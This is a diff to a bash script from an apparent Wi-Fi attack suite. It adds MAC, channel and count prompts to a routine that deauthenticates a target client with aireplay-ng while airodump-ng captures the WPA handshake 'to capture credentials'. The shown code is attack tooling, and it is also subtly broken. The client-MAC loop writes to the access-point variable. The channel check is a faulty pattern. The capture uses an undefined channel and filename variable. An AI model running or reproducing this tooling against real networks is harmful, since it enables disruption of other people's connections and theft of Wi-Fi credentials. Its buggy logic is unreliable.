@@ -842,6 +842,7 @@ echo $STD
 echo $STD"Available interface(s);"
 f_iface_stat
 echo $STD
+#
 echo -ne $GRN">$STD Enter monitor interface: $GRN"
 read IFACE
 	if [ "$IFACE" == "" ] ; then f_menu ; fi
@@ -856,19 +857,59 @@ read IFACE
 	sleep 1.5
 	f_force_wpa
 	fi 
-
+#
 echo -n $GRN">$STD Enter target AP BSSID: $GRN"
 read TARGET_AP
+while [[ ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]]
+do echo $RED">$STD Input error $RED[$STD$MACCH$RED]$STD Incorrect MAC syntax."
+echo -ne $GRN">$STD Enter target AP BSSID: $GRN"
+read TARGET_AP
+done
+	if [[ "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ ]] ; then
+	TARGET_AP=$(echo "$TARGET_AP" | sed 's/-/:/g')
+	fi
+#
 echo -n $GRN">$STD Enter channel of target AP: $GRN"
 read TARGET_CHAN
+while [[ "$TARGET_CHAN" != [1-14] ]] ; do
+echo $RED">$STD Input error $RED[$STD$TARGET_CHAN$RED]$STD Enter existing channel number."
+echo -n $GRN">$STD Enter channel of target AP: $GRN"
+read TARGET_CHAN
+done
+#
 echo -n $GRN">$STD Enter target Client MAC: $GRN"
 read TARGET_CL
+while [[ ! "$TARGET_CL" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_CL" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]]
+do echo $RED">$STD Input error $RED[$STD$TARGET_CL$RED]$STD Incorrect MAC syntax."
+echo -ne $GRN">$STD Enter target Client MAC: $GRN"
+read TARGET_AP
+done
+	if [[ "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ ]] ; then
+	TARGET_AP=$(echo "$TARGET_AP" | sed 's/-/:/g')
+	fi
+#
+echo $GRN">$STD Enter scantime duration: $GRN"
+read SCANTIME
+while [ ! `expr $SCANTIME + 1 2> /dev/null` ] ; do
+echo $RED">$STD Input error $RED[$STD$SCANTIME$RED]$STD Only numeric values possible."
+echo $GRN">$STD Enter scantime duration: $GRN"
+read SCANTIME
+done
+#
+echo $GRN">$STD Enter number of deauth packets to send: $GRN"
+read DEAUTHS
+while [ ! `expr $DEAUTHS + 1 2> /dev/null` ] ; do
+echo $RED">$STD Input error $RED[$STD$DEAUTHS$RED]$STD Only numeric values possible."
+echo $GRN">$STD Enter number of deauth packets to send: $GRN"
+read DEAUTHS
+done
 echo $GRN">$STD Running airodump to capture credentials and aireplay to deauth client"
 DATE=$(date +"%Y%m%d-%H%M")
 FILEOUT='"$TARGET_AP$DATE".cap'
-timeout 15 timeout 15 xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -c $CHAN -w /root/THS_TMP/$FILEOUT & \
-xterm -T "THSuite" -geometry 90x36-0+0 -e aireplay-ng $IFACE -0 5 -a $TARGET_AP -c $TARGET_CL
-echo $GRN">$STD"
+
+sleep 4 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $IFACE -0 $DEAUTHS -a $TARGET_AP -c $TARGET_CL \
+& timeout $SCANTIME xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $CHAN --bssid $TARGET_AP --output-format cap -w /root/THS_TMP/$FILENAME
+#
 #
 # Option 2
 # Use scan assisted aquisition of WPA handshake 
@@ -1158,9 +1199,7 @@ f_menu
 ### TO DO
 ######### 
 # - Fix correct listing of networks with handshakes (4-2)
-# - Check for correct mac syntax on manual WPA handshake grabs.
 # - Convert cap to hccap 
-# - Fix SSID list creation output 
 # - Optimise code with functions to reduce size / improve performane
 # - Include option to alter output/temp folder
 # - Write general help file / help file for each menu item
